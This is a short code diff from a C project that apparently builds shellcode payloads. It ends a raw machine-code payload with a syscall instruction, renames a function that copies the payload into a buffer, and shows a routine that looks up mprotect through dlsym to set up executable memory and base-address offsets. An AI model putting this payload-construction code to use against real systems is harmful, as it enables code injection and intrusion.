@@ -51,11 +51,11 @@ static const Payload payload0 = {
 			0x0f, 0x05					// syscall
 		} // .raw
 	} // .pl_scu
-}; // payload
+}; // payload0
 
- Payload baseload(void) {
-	return payload0;
-} // baseload()
+void initload(PayloadPtr plp) {
+	*plp = payload0;
+} // initload()
 
 void makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
 	size_t libc_size	= getpagesize() * 100; // Punt
@@ -71,7 +71,7 @@ void makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
 	Pointer	libc_mprotect	= dlsym(RTLD_NEXT, "mprotect");
 
 	// Offsets are relative to the payload
-	baseAddressesPtr->buffer_base = plp;
+	baseAddressesPtr->buf_base = plp;
 
 	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));
 
